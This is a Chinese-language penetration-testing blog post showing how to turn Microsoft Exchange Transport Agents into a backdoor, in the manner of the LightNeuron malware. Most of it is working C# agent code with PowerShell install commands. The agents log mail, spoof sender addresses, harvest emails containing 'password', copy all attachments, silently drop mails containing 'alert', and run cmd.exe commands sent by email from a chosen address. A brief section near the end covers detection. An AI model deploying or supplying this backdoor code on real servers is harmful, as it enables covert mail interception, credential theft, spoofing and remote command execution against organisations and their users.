---
layout: post
title: 渗透技巧——使用Transport Agent作为Exchange后门
---


## 0x00 前言
---

ESET研究发现了一个专门针对Microsoft Exchange的恶意软件LightNeuron，使用一种从未见过的持久性技术：Transport Agent，能够实现以下功能：

- 阅读和修改通过邮件服务器的任何电子邮件
- 撰写并发送新电子邮件
- 阻止任何电子邮件。原始收件人将不会收到电子邮件

参考资料：

https://www.welivesecurity.com/2019/05/07/turla-lightneuron-email-too-far/

https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf

本文仅在技术研究的角度，介绍Transport Agent的用法，编写代码实现不同的功能，结合利用思路给出防御建议

## 0x01 简介
---

本文将要介绍以下内容：

- Transport Agent基础知识
- Transport Agent的用法
- 使用Transport Agent监控邮件
- 使用Transport Agent修改邮件
- 使用Transport Agent删除邮件
- 使用Transport Agent启动程序
- 防御检测


## 0x02 Transport Agent基础知识
---

参考资料

https://docs.microsoft.com/en-us/previous-versions/office/developer/exchange-server-2010/dd877026(v=exchg.140)

### 1.Transport Agent

可以用来扩展和修改Exchange的传输行为，以自定义消息的接受，拒绝，路由和传递，以及在各种类型的内容之间进行转换

简单理解，Transport Agents作为Exchange的插件，能够对Exchange的传输行为进行扩展和修改，例如读取、修改和删除传输的每一份邮件

### 2..NET Framework Extensions for Exchange

`Microsoft.Exchange.Data`命名空间提供了便于执行以下任务的类型：

- 读写MIME数据
- 将消息正文和其他文本从一种编码转换为另一种编码
- 读取和写入TNEF数据
- 读写日历和约会
- 转换消息格式；例如，从HTML到RTF
- 响应SMTP事件
- 响应路由事件

简单理解，使用Microsoft.Exchange.Data命名空间能够扩展和修改Exchange的传输行为

## 0x03 Transport Agent的使用
---

参考资料：

https://docs.microsoft.com/en-us/previous-versions/office/developer/exchange-server-2010/aa579185(v=exchg.140)?redirectedfrom=MSDN

C#开发，使用`Microsoft.Exchange.Data`命名空间

使用VisualStudio，新建C#项目，项目类型选择类库，引用以下dll：

- Microsoft.Exchange.Data.Common.dll
- Microsoft.Exchange.Data.Transport.dll

dll可从Exchange服务器上获得，位置为`%ExchangeInstallPath%Public`，例如`C:\Program Files\Microsoft\Exchange Server\V15\Public`

测试代码如下：

```
using System;
using System.Collections.Generic;
using System.Text;
using Microsoft.Exchange.Data.Transport;
using Microsoft.Exchange.Data.Transport.Smtp;

namespace MyAgents
{
    public sealed class MyAgentFactory : SmtpReceiveAgentFactory
    {
        public override SmtpReceiveAgent CreateAgent(SmtpServer server)
        {
            return new MyAgent();
        }
    }
    public class MyAgent : SmtpReceiveAgent
    {
        public MyAgent()
        {
            this.OnEndOfData += new EndOfDataEventHandler(MyEndOfDataHandler);
        }
        private void MyEndOfDataHandler (ReceiveMessageEventSource source, EndOfDataEventArgs e)

        {
            // The following line appends text to the subject of the message that caused the event.
            e.MailItem.Message.Subject += " - this text appended by MyAgent";
        }
    }
}
```

编译生成MyAgent.dll

将MyAgent.dll复制到Exchange服务器，保存路径为`C:\test\MyAgent.dll`

使用Exchange Server PowerShell安装Transport Agent，命令如下：

```
Install-TransportAgent -Name "MySpamFilterAgent" -TransportAgentFactory "MyAgents.MyAgentFactory"  -AssemblyPath "C:\test\MyAgent.dll"
Enable-TransportAgent MySpamFilterAgent
Restart-Service MSExchangeTransport
```

需要重启服务MSExchangeTransport才能够生效

卸载Transport Agent的命令：

```
Uninstall-TransportAgent MySpamFilterAgent -Confirm:$false
Restart-Service MSExchangeTransport
```

查看这个Transport Agent的命令：

```
Get-TransportAgent MySpamFilterAgent|fl
```

查看所有Transport Agent的命令：

```
Get-TransportAgent |fl
```

Transport Agent安装成功后，使用任意用户发送邮件，邮件标题被修改，测试成功

## 0x04 使用Transport Agent实现不同的功能
---

### 示例1

监控邮件，记录发件人和时间，文件保存为`c:\test\log.txt`

代码如下：

```
using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using Microsoft.Exchange.Data.Transport;
using Microsoft.Exchange.Data.Transport.Smtp;

namespace MyAgents
{
    public sealed class MyAgentFactory : SmtpReceiveAgentFactory
    {
        public override SmtpReceiveAgent CreateAgent(SmtpServer server)
        {
            return new MyAgent();
        }
    }
    public class MyAgent : SmtpReceiveAgent
    {
        public MyAgent()
        {
            this.OnEndOfData += new EndOfDataEventHandler(MyEndOfDataHandler);
        }
        private void MyEndOfDataHandler(ReceiveMessageEventSource source, EndOfDataEventArgs e)

        {
            using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"C:\test\log.txt", true))
            {
                file.WriteLine("Sender:" + e.MailItem.Message.Sender.SmtpAddress);
                file.WriteLine("Date:" + e.MailItem.Message.Date);
            }
        }
    }
}
```

### 示例2

修改邮件的发件人和主题

代码如下：

```
using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using Microsoft.Exchange.Data.Transport;
using Microsoft.Exchange.Data.Transport.Smtp;

namespace MyAgents
{
    public sealed class MyAgentFactory : SmtpReceiveAgentFactory
    {
        public override SmtpReceiveAgent CreateAgent(SmtpServer server)
        {
            return new MyAgent();
        }
    }
    public class MyAgent : SmtpReceiveAgent
    {
        public MyAgent()
        {
            this.OnEndOfData += new EndOfDataEventHandler(MyEndOfDataHandler);
        }
        private void MyEndOfDataHandler(ReceiveMessageEventSource source, EndOfDataEventArgs e)

        {
            // The following line appends text to the subject of the message that caused the event.
            e.MailItem.Message.Subject += " - this text appended by MyAgent";
            e.MailItem.Message.From.DisplayName = "test2";
            e.MailItem.Message.From.SmtpAddress = "test2@test.com";
            e.MailItem.Message.Sender.DisplayName = "test2";
            e.MailItem.Message.Sender.SmtpAddress = "test2@test.com";
        }
    }
}
```

### 示例3

监控邮件，如果邮件中包括字符串`password`(不区分大小写)，则将这份邮件保存至`c:\test`，文件名称为`<MessageId>.eml`(为了避免文件名重复，这是使用唯一的MessageId作为文件名)

代码如下：

```
using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using Microsoft.Exchange.Data.Transport;
using Microsoft.Exchange.Data.Transport.Smtp;

namespace MyAgents
{
    public sealed class MyAgentFactory : SmtpReceiveAgentFactory
    {
        public override SmtpReceiveAgent CreateAgent(SmtpServer server)
        {
            return new MyAgent();
        }
    }
    public class MyAgent : SmtpReceiveAgent
    {
        public MyAgent()
        {
            this.OnEndOfData += new EndOfDataEventHandler(MyEndOfDataHandler);
        }
        private void MyEndOfDataHandler(ReceiveMessageEventSource source, EndOfDataEventArgs e)

        {

            long len = e.MailItem.GetMimeReadStream().Length;
            byte[] heByte = new byte[len];
            int r = e.MailItem.GetMimeReadStream().Read(heByte, 0, heByte.Length);
            string searchData = System.Text.Encoding.UTF8.GetString(heByte);
            if (searchData.IndexOf("password", 0, StringComparison.CurrentCultureIgnoreCase) != -1)
            {
                string[] sArray = e.MailItem.Message.MessageId.Split('@');
                sArray[0] = sArray[0].Substring(1);

                FileStream fs = new FileStream("c:\\test\\" + sArray[0] + ".eml", FileMode.Create);
                fs.Write(heByte, 0, heByte.Length);
                fs.Close();
            }
        }
    }
}
```

### 示例4

监控附件，将附件名称保存在`c:\test\log.txt`，将所有附件保存至`c:\test`，文件名称为附件名称

代码如下：

```
using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using Microsoft.Exchange.Data.Transport;
using Microsoft.Exchange.Data.Transport.Smtp;

namespace MyAgents
{
    public sealed class MyAgentFactory : SmtpReceiveAgentFactory
    {
        public override SmtpReceiveAgent CreateAgent(SmtpServer server)
        {
            return new MyAgent();
        }
    }
    public class MyAgent : SmtpReceiveAgent
    {
        public MyAgent()
        {
            this.OnEndOfData += new EndOfDataEventHandler(MyEndOfDataHandler);
        }
        private void MyEndOfDataHandler(ReceiveMessageEventSource source, EndOfDataEventArgs e)

        {
            if (e.MailItem.Message.Attachments.Count != 0)
            {
                foreach (var attachment in e.MailItem.Message.Attachments)
                {
                    using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"C:\test\log.txt", true))
                    {
                        file.WriteLine(attachment.FileName);
                    }
                    FileStream fs = new FileStream("c:\\test\\" + attachment.FileName, FileMode.Create);
                    attachment.GetContentReadStream().CopyTo(fs);
                    fs.Close();
                }

            }
        }
    }
}
```

相比于示例代码3，将数据保存至文件的功能有所区别

示例3采用了先从流中读取数据并保存在字节数组中，再将字节数组转换为字符串，最后通过`FileStream`将字符串写入文件，这样虽然效率变慢，但是支持对全文内容进行搜索

示例代码4不需要考虑全文搜索，所以可以使用`Stream.CopyTo`复制两个流来提高效率

### 示例5

监控邮件，如果邮件内容包括字符串`alert`(不区分大小写)，那么将这份邮件丢弃

代码如下：

```
using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using Microsoft.Exchange.Data.Transport;
using Microsoft.Exchange.Data.Transport.Smtp;

namespace MyAgents
{
    public sealed class MyAgentFactory : SmtpReceiveAgentFactory
    {
        public override SmtpReceiveAgent CreateAgent(SmtpServer server)
        {
            return new MyAgent();
        }
    }
    public class MyAgent : SmtpReceiveAgent
    {
        public MyAgent()
        {
            this.OnEndOfData += new EndOfDataEventHandler(MyEndOfDataHandler);
        }
        private void MyEndOfDataHandler(ReceiveMessageEventSource source, EndOfDataEventArgs e)
        {
            long len = e.MailItem.GetMimeReadStream().Length;
            byte[] heByte = new byte[len];
            int r = e.MailItem.GetMimeReadStream().Read(heByte, 0, heByte.Length);
            string searchData = System.Text.Encoding.UTF8.GetString(heByte);
            if (searchData.IndexOf("alert", 0, StringComparison.CurrentCultureIgnoreCase) != -1)
            {
                foreach (EnvelopeRecipient ep in e.MailItem.Recipients)
                {
                    e.MailItem.Recipients.Remove(ep);
                }
            }
        }
    }
}
```

### 示例6

监控邮件，如果邮件来自指定用户(testa@test.com)，主题为`command`，那么将执行邮件正文中的内容xxxx(格式为command:xxxx/command)

代码如下：

```
using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using Microsoft.Exchange.Data.Transport;
using Microsoft.Exchange.Data.Transport.Smtp;
using System.Diagnostics;

namespace MyAgents
{
    public sealed class MyAgentFactory : SmtpReceiveAgentFactory
    {
        public override SmtpReceiveAgent CreateAgent(SmtpServer server)
        {
            return new MyAgent();
        }
    }
    public class MyAgent : SmtpReceiveAgent
    {
        public MyAgent()
        {
            this.OnEndOfData += new EndOfDataEventHandler(MyEndOfDataHandler);
        }
        private void MyEndOfDataHandler(ReceiveMessageEventSource source, EndOfDataEventArgs e)
        {
            if (e.MailItem.Message.From.SmtpAddress == "testa@test.com")
            {
                if(e.MailItem.Message.Subject.Contains("command"))
                {
                    long len = e.MailItem.Message.Body.GetContentReadStream().Length;
                    byte[] heByte = new byte[len];
                    int r = e.MailItem.Message.Body.GetContentReadStream().Read(heByte, 0, heByte.Length);
                    string myStr = System.Text.Encoding.UTF8.GetString(heByte);
                    int i = myStr.IndexOf("command:");
                    int j = myStr.IndexOf("/command");
                    myStr = myStr.Substring(i + 8, j - i - 8);

                    Process p = new Process();
                    p.StartInfo.FileName = "cmd.exe";
                    p.StartInfo.Arguments = "/c" + myStr;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.RedirectStandardInput = true;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardError = true;
                    p.StartInfo.CreateNoWindow = true;
                    p.Start();

                }
            }


        }
    }
}
```

启动的进程权限为`NETWORK SERVICE`

### 补充

为了便于调试，捕获错误并将错误代码输出至文件`c:\test\log.txt`

代码如下：

```
using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using Microsoft.Exchange.Data.Transport;
using Microsoft.Exchange.Data.Transport.Smtp;
using System.Diagnostics;

namespace MyAgents
{
    public sealed class MyAgentFactory : SmtpReceiveAgentFactory
    {
        public override SmtpReceiveAgent CreateAgent(SmtpServer server)
        {
            return new MyAgent();
        }
    }
    public class MyAgent : SmtpReceiveAgent
    {
        public MyAgent()
        {
            this.OnEndOfData += new EndOfDataEventHandler(MyEndOfDataHandler);
        }
        private void MyEndOfDataHandler(ReceiveMessageEventSource source, EndOfDataEventArgs e)
        {
            try
            {
                
            }
            catch (Exception ex)
            {
                using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"C:\test\log.txt", true))
                {
                    file.WriteLine(ex.Message);
                }

            }


        }
    }
}
```


## 0x05 防御检测
---

### 1.查看Transport Agent配置

使用Exchange Server PowerShell，命令如下：

```
Get-TransportAgent
```

其他Powershell命令可参考：

https://docs.microsoft.com/en-us/powershell/module/exchange/?view=exchange-ps#mail-flow

### 2.查看服务日志

安装Transport Agent需要重启服务MSExchangeTransport

### 3.查看进程

使用Transport Agent后，进程w3wp.exe将会加载对应的dll

可以查看进程w3wp.exe是否加载可疑dll

## 0x06 小结
---

本文介绍了Transport Agent的用法，编写代码实现对邮件的记录、修改和删除，实现了作为后门使用的常用功能，结合利用思路给出防御建议



---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)







